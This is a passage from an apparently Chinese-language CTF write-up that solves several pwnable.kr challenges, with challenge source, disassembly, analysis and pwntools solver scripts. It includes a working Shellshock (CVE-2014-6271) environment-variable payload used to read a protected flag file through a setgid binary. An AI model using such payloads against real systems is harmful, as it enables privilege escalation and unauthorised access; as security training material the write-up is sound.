class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>一共有 5 关：</p><ol><li>传入 100 个参数，参数 ‘A’(65) 为 <code>\x00</code> 参数 ‘B’(66) 为 <code>\x20\x0a\x0d</code></li><li>从 stdin 中读取输入 <code>\x00\x0a\x00\xff</code>，stderr 中读取输入<code>\x00\x0a\x02\xff</code></li><li>从环境变量去读<code>\xde\xad\xbe\xef</code>，需要值为<code>\xca\xfe\xba\xbe</code></li><li>读当前目录下<code>\x0a</code>文件，前 4 个字节需要为<code>\x00\x00\x00\x00</code></li><li>读取参数 ‘C’(67) 为端口值，发送<code>b</code>至此端口</li></ol><h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepconn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"input2"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stdin"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stderr"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"/tmp/sa/\x0a"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"."</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x00"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x20\x0a\x0d"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"47362"</span>envs <span class="token operator">=</span> <span class="token punctuation">{</span>b<span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">:</span>b<span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">}</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>args<span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token string">"/tmp/sa/"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>envs<span class="token punctuation">,</span> executable<span class="token operator">=</span><span class="token string">"/home/input2/input"</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token string">"/tmp/stdin"</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token string">"/tmp/stderr"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sock <span class="token operator">=</span> conn<span class="token punctuation">.</span>remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">47362</span><span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行结果：</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/pwnable.kr$ /usr/bin/python3 /home/pwn/pwnable.kr/7_input.py[+] Connecting to pwnable.kr on port 2222: Done[*] input2@pwnable.kr:    Distro    Ubuntu 16.04    OS:       linux    Arch:     amd64    Version:  4.4.179    ASLR:     Enabled[+] Starting remote process '/home/input2/input' on pwnable.kr: pid 145635[*] Switching to interactive modeWelcome to pwnable.krLet's see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy! I learned how to pass various input in Linux :)[*] Got EOF while reading in interactive</code></pre><h2 id="8-leg"><a href="#8-leg" class="headerlink" title="8. leg"></a>8. leg</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">int</span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span>    <span class="token string">"push    {r6}\n"</span>    <span class="token string">"add    r6, pc, $1\n"</span>    <span class="token string">"bx        r6\n"</span>    <span class="token string">".code    16\n"</span>    <span class="token string">"mov    r3, pc\n"</span>    <span class="token string">"add    r3, $0x4\n"</span>    <span class="token string">"push    {r3}\n"</span>    <span class="token string">"pop    {pc}\n"</span>    <span class="token string">".code    32\n"</span>    <span class="token string">"pop    {r6}\n"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-armasm"><code class="language-armasm">(gdb) disass mainDump of assembler code for function main:   0x00008d3c <+0>:        push    {r4, r11, lr}   0x00008d40 <+4>:        add        r11, sp, #8   0x00008d44 <+8>:        sub        sp, sp, #12   0x00008d48 <+12>:    mov        r3, #0   0x00008d4c <+16>:    str        r3, [r11, #-16]   0x00008d50 <+20>:    ldr        r0, [pc, #104]    ; 0x8dc0 <main+132>   0x00008d54 <+24>:    bl        0xfb6c <printf>   0x00008d58 <+28>:    sub        r3, r11, #16   0x00008d5c <+32>:    ldr        r0, [pc, #96]    ; 0x8dc4 <main+136>   0x00008d60 <+36>:    mov        r1, r3   0x00008d64 <+40>:    bl        0xfbd8 <__isoc99_scanf>   0x00008d68 <+44>:    bl        0x8cd4 <key1>   0x00008d6c <+48>:    mov        r4, r0   0x00008d70 <+52>:    bl        0x8cf0 <key2>   0x00008d74 <+56>:    mov        r3, r0   0x00008d78 <+60>:    add        r4, r4, r3   0x00008d7c <+64>:    bl        0x8d20 <key3>   0x00008d80 <+68>:    mov        r3, r0   0x00008d84 <+72>:    add        r2, r4, r3   0x00008d88 <+76>:    ldr        r3, [r11, #-16]   0x00008d8c <+80>:    cmp        r2, r3   0x00008d90 <+84>:    bne        0x8da8 <main+108>   0x00008d94 <+88>:    ldr        r0, [pc, #44]    ; 0x8dc8 <main+140>   0x00008d98 <+92>:    bl        0x1050c <puts>   0x00008d9c <+96>:    ldr        r0, [pc, #40]    ; 0x8dcc <main+144>   0x00008da0 <+100>:    bl        0xf89c <system>   0x00008da4 <+104>:    b        0x8db0 <main+116>   0x00008da8 <+108>:    ldr        r0, [pc, #32]    ; 0x8dd0 <main+148>   0x00008dac <+112>:    bl        0x1050c <puts>   0x00008db0 <+116>:    mov        r3, #0   0x00008db4 <+120>:    mov        r0, r3   0x00008db8 <+124>:    sub        sp, r11, #8   0x00008dbc <+128>:    pop        {r4, r11, pc}   0x00008dc0 <+132>:    andeq    r10, r6, r12, lsl #9   0x00008dc4 <+136>:    andeq    r10, r6, r12, lsr #9   0x00008dc8 <+140>:                ; <UNDEFINED> instruction: 0x0006a4b0   0x00008dcc <+144>:                ; <UNDEFINED> instruction: 0x0006a4bc   0x00008dd0 <+148>:    andeq    r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1:   0x00008cd4 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cd8 <+4>:        add        r11, sp, #0   0x00008cdc <+8>:        mov        r3, pc   0x00008ce0 <+12>:    mov        r0, r3   0x00008ce4 <+16>:    sub        sp, r11, #0   0x00008ce8 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008cec <+24>:    bx        lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2:   0x00008cf0 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cf4 <+4>:        add        r11, sp, #0   0x00008cf8 <+8>:        push    {r6}        ; (str r6, [sp, #-4]!)   0x00008cfc <+12>:    add        r6, pc, #1   0x00008d00 <+16>:    bx        r6   0x00008d04 <+20>:    mov        r3, pc   0x00008d06 <+22>:    adds    r3, #4   0x00008d08 <+24>:    push    {r3}   0x00008d0a <+26>:    pop        {pc}   0x00008d0c <+28>:    pop        {r6}        ; (ldr r6, [sp], #4)   0x00008d10 <+32>:    mov        r0, r3   0x00008d14 <+36>:    sub        sp, r11, #0   0x00008d18 <+40>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d1c <+44>:    bx        lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3:   0x00008d20 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008d24 <+4>:        add        r11, sp, #0   0x00008d28 <+8>:        mov        r3, lr   0x00008d2c <+12>:    mov        r0, r3   0x00008d30 <+16>:    sub        sp, r11, #0   0x00008d34 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d38 <+24>:    bx        lrEnd of assembler dump.(gdb) </code></pre><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>通过 c 文件看，就是找到 key1、key2、key3 之和即可</p><ul><li><p>key1：</p><ul><li>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节</li><li>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节</li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15910787471583.jpg" alt="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf"></p><p>当只有一个结果返回时，会放在 r0 里，所以 key1：0x00008cdc + 0x8 = 0x00008ce4</p></li><li><p>key2：<br>由于 0x00008cfc 处 r6：0x1 + 0x00008cfc + 0x8 = 0x00008d05 最后一位为 1 导致在0x00008d00处进入 Thumb 状态，于是 0x00008d06 处 r3 = 0x00008d04 + 0x4 + 0x4 = 0x00008d0c</p></li><li><p>key3：</p><p>连接寄存器r14（LR）：每种模式下r14都有自身版组，它有两个特殊功能：</p><ol><li>保存子程序返回地址。使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回</li><li>当异常发生时，异常模式的r14用来保存异常返回地址，将r14如栈可以处理嵌套中断</li></ol><p>可以看到下一条指令的地址为 0x00008d80</p><p>所以 key3：0x00008d80</p></li></ul><p>综合计算 key1 + key2 + key3 = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400</p><h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">/ $ ./legDaddy has very strong arm! : 108400Congratz!My daddy has a lot of ARMv5te muscle!</code></pre><h2 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9. mistake"></a>9. mistake</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> PW_LEN 10</span><span class="token macro property">#<span class="token directive keyword">define</span> XORKEY 1</span><span class="token keyword">void</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> XORKEY<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/mistake/password"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">,</span><span class="token number">0400</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open password %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"do not bruteforce...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pw_buf<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>pw_buf<span class="token punctuation">,</span>PW_LEN<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">char</span> pw_buf2<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input password : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%10s"</span><span class="token punctuation">,</span> pw_buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// xor your input</span>    <span class="token function">xor</span><span class="token punctuation">(</span>pw_buf2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>pw_buf<span class="token punctuation">,</span> pw_buf2<span class="token punctuation">,</span> PW_LEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>题目给了提示</p><p>hint : operator priority</p><p>然后注意到这句<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>这里面的执行优先级是有问题的，应该为<code>if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0)</code>，错误的写法导致 fd=0，紧跟着 read 则会从 stdin里面读取 10 位长度内容作为 password</p><p>所以最终 pw_buf 和 pw_buf2 我们都能控制，只要保证每一位和 1 进行亦或即可</p><h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">mistake@pwnable:~$ ./mistake do not bruteforce...0000000000input password : 1111111111Password OKMommy, the operator priority always confuses me :(</code></pre><h2 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10. shellshock"></a>10. shellshock</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setresgid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/shellshock/bash -c 'echo shock_me'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>破壳漏洞的利用，<a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这篇文章</a>好点</p><p>查看有漏洞的 bash 版本</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ./bash --versionGNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)</code></pre><p>同时注意到文件权限</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ls -sailtotal 98023593359   4 drwxr-x---   5 root shellshock       4096 Oct 23  2016 .23593232   4 drwxr-xr-x 116 root root             4096 Apr 17 14:10 ..23593368 940 -r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash23593367   4 d---------   2 root root             4096 Oct 12  2014 .bash_history23593366   4 -r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag23593364   4 dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi23593361   4 drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache23593363  12 -r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock23593360   4 -r--r--r--   1 root root              188 Oct 12  2014 shellshock.c</code></pre><h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ env x='() { :;}; /home/shellshock/bash -c "cat /home/shellshock/flag"' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped)</code></pre><h2 id="11-coin"><a href="#11-coin" class="headerlink" title="11. coin"></a>11. coin</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><pre class=" language-shell"><code class="language-shell">    ---------------------------------------------------    -              Shall we play a game?              -    ---------------------------------------------------    You have given some gold coins in your hand    however, there is one counterfeit coin among them    counterfeit coin looks exactly same as real coin    however, its weight is different from real one    real coin weighs 10, counterfeit coin weighes 9    help me to find the counterfeit coin with a scale    if you find 100 counterfeit coins, you will get reward :)    FYI, you have 60 seconds.    - How to play -     1. you get a number of coins (N) and number of chances (C)    2. then you specify a set of index numbers of coins to be weighed    3. you get the weight information    4. 2~3 repeats C time, then you give the answer    - Example -    [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial    [Client] 0 1         # weigh first and second coin    [Server] 20            # scale result : 20    [Client] 3            # weigh fourth coin    [Server] 10            # scale result : 10    [Client] 2             # counterfeit coin is third!    [Server] Correct!    - Ready? starting in 3 sec... -</code></pre><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>二分法找 coin</p><h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><p>远程跑容易受到网络影响，推荐部署到<code>/tmp/</code>里本地跑，非常快</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> re <span class="token keyword">import</span> compileconn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getList</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>int<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    status <span class="token operator">=</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;-] recv: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>    NC <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^N=([0-9]*) C=([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    W <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> NC<span class="token punctuation">:</span>        end <span class="token operator">=</span> int<span class="token punctuation">(</span>NC<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span>         status <span class="token operator">=</span> <span class="token boolean">True</span>      <span class="token keyword">elif</span> W<span class="token punctuation">:</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>W<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">:</span>            fp <span class="token operator">=</span> sp        tp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>tp<span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tp<span class="token punctuation">)</span>        status <span class="token operator">=</span> <span class="token 